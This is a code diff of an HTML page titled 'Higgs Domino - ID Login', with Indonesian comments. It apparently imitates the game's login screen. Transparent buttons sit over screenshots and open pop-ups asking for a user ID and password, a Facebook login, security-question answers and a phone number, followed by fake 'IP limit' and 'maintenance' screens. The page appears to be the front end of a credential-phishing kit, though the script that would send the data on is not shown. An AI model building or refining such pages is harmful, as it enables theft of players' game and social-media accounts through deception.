@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <audio autoplay loop id="lhjblg" src="sound/lobby_bk.mp3"></audio>
+    <audio id="clickSound" src="sound/click-sound.mp3"></audio>
     <title>Higgs Domino - ID Login</title>
     <link rel="stylesheet" href="js/style.css">
 
@@ -22,13 +24,12 @@
     onclick="showFbLoginPopup()" 
     style="
         position: absolute; 
-        top: 68%; 
-        left: 36%; 
+        top: 68%; /* Sesuaikan posisi */
+        left: 36%; /* Sesuaikan posisi */
         width: 250px;
         height: 45px;
         background:transparent;
-        border: none;
-        z-index: 1001; /* Z-Index Ditambahkan untuk menghindari stuck */
+        border: none; 
         ">
 </button>
 
@@ -55,43 +56,55 @@
     <button type="button" class="create-account-button">Buat akun baru</button>
 </form>
 </div>
-
-<button 
+    <!-- Tombol ID Login -->
+    <button 
     onclick="playClickSound(); showPopup()" 
     style="position: absolute; top: 15%; left: -6%; width: 153px; height: 49px; background: transparent; border: none; border-radius: 30%; z-index: 1000;">
 </button>
-
-<div class="popup" id="loginPopup"> 
-    <img src="img/login.png" alt="ID Login Form">
-    <div class="input-container">
-        <input type="number" id="userID" placeholder="Enter User Id">
-        <input type="password" id="password" placeholder="6-16 characters">
-        <span id="togglePassword" 
-        style="position: absolute; right: -5px; top: 46%; transform: translateY(-50%); color: transparent; 
-               user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
-        ⌒ ⊙ 
-  </span>
+    <!-- Pop-up Form Login -->
+    <div id="overlay" class="overlay"></div> <!-- Overlay -->
+    <div class="popup" id="loginPopup"> <!-- Popup -->
+        <div id="overlay" class="overlay"></div>
+        <img src="img/login.png" alt="ID Login Form">
+        <div class="input-container">
+            <input type="number" id="userID" placeholder="Enter User Id">
+            <input type="password" id="password" placeholder="6-16 characters">
+            <span id="togglePassword" 
+            style="position: absolute; right: -5px; top: 46%; transform: translateY(-50%); color: transparent; 
+                   user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+            ⌒ ⊙ 
+      </span>
+        </div>
+        <button class="close" onclick="hidePopup()"></button>
+        <button 
+    id="submitButton" 
+    style="position: absolute; bottom: 16%; left: 37%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 10%; z-index: 1000;" 
+    onclick="playClickSound(); showSecurityNotification()">
+</button>
     </div>
-    <button class="close" onclick="hidePopup()"></button>
-    <button 
-        id="submitButton" 
-        style="position: absolute; bottom: 16%; left: 37%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 10%; z-index: 1000;" 
-        onclick="playClickSound(); showSecurityNotification()">
-    </button>
-</div>
 
-<div class="notification-container" id="securityNotification">
-    <img src="img/keamanan.png" alt="Keamanan">
-    <button style="position: absolute; bottom: 16%; left: 31%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 14%; z-index: 1000;"  onclick="playClickSound();showVerification()"></button>
-</div>
+    <!-- Gambar Keamanan -->
+    <div class="notification-container" id="securityNotification">
+        <img src="img/keamanan.png" alt="Keamanan">
+        <button style="position: absolute; bottom: 16%; left: 31%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 14%; z-index: 1000;"  onclick="playClickSound();showVerification()"></button>
+    </div>
+
+<!-- Gambar Verifikasi -->
+<div class="overlay" id="overlay"></div>
 
 <div class="popup" id="verificationSection">
     <button class="close close-verification" onclick="hideVerification()">×</button>
+
+    <!-- Gambar -->
     <img id="verifImage" src="img/verifikasi.png" alt="Verifikasi">
+
+    <!-- Input -->
     <div class="input-container" style="left: 21%;">
         <input type="text" id="answer1" class="input-placeholder" placeholder="Please enter the answer">
         <input type="text" id="answer2" class="input-placeholder" placeholder="Please enter the answer">
     </div>
+
+    <!-- Tombol Kirim (sekarang sudah di dalam verificationSection) -->
     <button 
         class="submit-button" 
         style="position: absolute; bottom: 16%; left: 31%; background: transparent; color: transparent; width: 120px; height: 40px; border: none; border-radius: 10%; z-index: 0;" 
@@ -99,7 +112,25 @@
 </div>
 
 
-<button 
+    <!-- Tombol untuk Pengunjung -->
+    <button 
+        onclick="showIpLimitImage()" 
+        style="
+            position: absolute; 
+            bottom: 7%; 
+            left: 42%; 
+            width: 140px; 
+            height: 44px; 
+            background: none; 
+            color: transparent; 
+            font-size: 16px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            z-index: 1;">
+        Tampilkan Gambar
+    </button>
+    <button 
     onclick="showLoadingThenVisitor()" 
     style="
         position: absolute; 
@@ -117,33 +148,34 @@
     Tampilkan Gambar
 </button>
 
-<div id="ipLimitPopup" style="
-    display: none; 
-    position: fixed; 
-    top: 20%; 
-    left: 27%; 
-    width: 46%; 
-    height: auto; 
-    background: none; 
-    z-index: 1000; 
-    border-radius: 10px;">
-    <img src="img/iplimit.png" alt="IP Limit" style="width: 100%; height: 100%; border-radius: 10px;">
-    <button onclick="hideIpLimitImage(); event.stopPropagation();" style="
-        position: absolute; 
-        top: 63%; 
-        right: 32%; 
-        background: transparent; 
-        color: transparent; 
-        border: none; 
-        border-radius: 18%; 
-        width: 154px; 
-        height:50px; 
-        cursor: pointer;">
-        ×
-    </button>
-</div>
 
-<button 
+    <!-- Popup Gambar IPLimit -->
+    <div id="ipLimitPopup" style="
+        display: none; 
+        position: fixed; 
+        top: 20%; 
+        left: 27%; 
+        width: 46%; 
+        height: auto; 
+        background: none; 
+        z-index: 1000; 
+        border-radius: 10px;">
+        <img src="img/iplimit.png" alt="IP Limit" style="width: 100%; height: 100%; border-radius: 10px;">
+        <button onclick="hideIpLimitImage(); event.stopPropagation();" style="
+            position: absolute; 
+            top: 63%; 
+            right: 32%; 
+            background: transparent; 
+            color: transparent; 
+            border: none; 
+            border-radius: 18%; 
+            width: 154px; 
+            height:50px; 
+            cursor: pointer;">
+            ×
+        </button>
+    </div>
+    <button 
     id="serviceButton"
     onclick="redirectToService()" 
     style="
@@ -161,8 +193,9 @@
         outline: none; 
         border: none;">
 </button>
+<div>
 
-
+<!-- Popup Gambar HP Login -->
 <div id="hpLoginPopup" style="
 display: none; 
 position: fixed; 
@@ -173,78 +206,164 @@ background: none;
 padding: 0; 
 border-radius: 10px; 
 z-index: 2000;">
+<img src="img/hplogin.png" alt="HP Login" style="
+    width: 105%; 
+    height: auto; 
+    border-radius: 10px;">
+<!-- Input nomor HP -->
+<div style="
+    position: absolute; 
+    top: 49%; /* Atur posisi input di dalam popup */
+    left: 25%; 
+    width: 70%; 
+    text-align: center;">
+    <input type="tel" placeholder="Masukkan No." style="
+    width: 65%; 
+    height: 33px; 
+    font-size: 16px; 
+    padding: 5px 10px; 
+    border-radius: 5px; 
+    background-color: transparent; /* Membuat latar belakang transparan */
+    color: #E1B09E; /* Warna teks */
+    border: none; /* Warna border */
+    outline: none; /* Menghilangkan outline saat fokus */
+    caret-color: #E1B09E; /* Warna kursor */">
+
+<style>
+
+input[type="tel"]::placeholder {
+color: #E1B09E;
+opacity: 1; 
+}
+</style>
+
+<!-- Tombol Tutup -->
+<button id="closeHpLoginPopup" onclick="hideHpLoginImage()" style="
+display: none; 
+position: fixed; 
+top: 18%; 
+right: 0%; 
+width: 14%; 
+height: 18%; 
+background: transparent; 
+color: transparent; 
+border: none; 
+padding: 10px 20px; 
+border-radius: px; 
+font-size: 16px; 
+z-index: 200000000;
+cursor: pointer;">
+Tutup
+</button>
+
+<!-- Tombol Tampilkan Verifikasi -->
+<button id="showVerificationButton" onclick="showVerificationImage()" style="
+    position: absolute; 
+    top: 179%; /* Atur posisi vertikal */
+    left: 21%; /* Atur posisi horizontal */
+    width: 143px; 
+    height: 44px; 
+    background-color: transparent; 
+    color: transparent; 
+    border: none; 
+    border-radius: 10px; 
+    font-size: 16px; 
+    cursor: pointer; 
+    z-index: 1000;">
+    Tampilkan Verifikasi
+</button>
+
+<div id="verificationPopup" style="
+display: none; 
+position: fixed; 
+top: -44px; 
+left: -280px; 
+width: 290%; 
+height: 290%; 
+background: rgba(0, 0, 0, 0.8); /* Overlay langsung diterapkan */
+z-index: 3000;">
+    <!-- Popup Gambar -->
+    <div style="
+        position: fixed; 
+        top: 59%; 
+        left: 44%; 
+        transform: translate(-50%, -50%); 
+        background: none; 
+        z-index: 3001;">
+        <img src="img/maintancehp.png" alt="Verifikasi" style="
+            width: 150%; /* Lebar gambar */
+            height: auto; 
+            border-radius: 10px;">
+        <button id="closeAllButton" onclick="closeAllPopups()" style="
+            position: absolute; 
+            top: 57%; 
+            right: 8%; 
+            width: 132px; 
+            height: 46px; 
+            background: transparent; 
+            color: transparent; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 14px; 
+            cursor: pointer; 
+            z-index: 3002;">
+        </button>
+    </div>
+</div>
+
+
 </div> 
-
-
-<script>
-    
-// Fungsi Pop-up Login ID
-function showPopup() {
-    const login = document.getElementById("loginPopup");
-    const o = document.getElementById("overlay");
-    if (login) login.style.display = 'block';
-    if (o) o.classList.add("active");
-}
-function hidePopup() {
-    const login = document.getElementById("loginPopup");
-    const o = document.getElementById("overlay");
-    if (login) login.style.display = 'none';
-    if (o) o.classList.remove("active");
-}
-
-// Fungsi Pop-up Facebook Login
-function showFbLoginPopup() {
-    const p = document.getElementById("fbLoginPopup");
-    const o = document.getElementById("overlay");
-    if (p) p.style.display = 'block';
-    if (o) o.classList.add("active");
-}
-function hideFbLoginPopup() {
-    const p = document.getElementById("fbLoginPopup");
-    const o = document.getElementById("overlay");
-    if (p) p.style.display = 'none';
-    if (o) o.classList.remove("active");
-}
-
-// Fungsi Pop-up HP Login (dibiarkan di sini karena menggunakan logika pop-up yang sama)
+    <script>
+        
 function showVerificationImage() {
-    document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('verificationPopup').style.display = 'block';
+    }
+
+        function closeAllPopups() {
+        document.getElementById('verificationPopup').style.display = 'none';
+    }
+        function showVerificationImage() {
+        document.getElementById('verificationPopup').style.display = 'block';
 }
+
 function hideVerificationImage() {
-    document.getElementById('verificationPopup').style.display = 'none';
-}
-function showHpLoginImage() {
-    document.getElementById('hpLoginPopup').style.display = 'block';
-    document.getElementById('closeHpLoginPopup').style.display = 'block'; 
-}
-function hideHpLoginImage() {
-    document.getElementById('hpLoginPopup').style.display = 'none';
-    document.getElementById('closeHpLoginPopup').style.display = 'none'; 
+        document.getElementById('verificationPopup').style.display = 'none';
 }
 
 function closeAllPopups() {
-    const hpLoginPopup = document.getElementById('hpLoginPopup');
+        const hpLoginPopup = document.getElementById('hpLoginPopup');
     if (hpLoginPopup) {
         hpLoginPopup.style.display = 'none';
     }
 
-    const closeHpLoginPopup = document.getElementById('closeHpLoginPopup');
+        const closeHpLoginPopup = document.getElementById('closeHpLoginPopup');
     if (closeHpLoginPopup) {
         closeHpLoginPopup.style.display = 'none';
     }
 
-    const verificationPopup = document.getElementById('verificationPopup');
+        const verificationPopup = document.getElementById('verificationPopup');
     if (verificationPopup) {
         verificationPopup.style.display = 'none';
     }
 
-    const maintancePopup = document.getElementById('maintancePopup');
+        const maintancePopup = document.getElementById('maintancePopup');
     if (maintancePopup) {
         maintancePopup.style.display = 'none';
     }
 }
-</script>
 
-<script src="js/script.js"></script>
+        function showHpLoginImage() {
+    document.getElementById('hpLoginPopup').style.display = 'block';
+    document.getElementById('closeHpLoginPopup').style.display = 'block'; }
+
+function hideHpLoginImage() {
+    document.getElementById('hpLoginPopup').style.display = 'none';
+    document.getElementById('closeHpLoginPopup').style.display = 'none'; }
+
+
+    </script>
+
+</button>
+    <script src="js/script.js"></script>
 </body>
 </html>
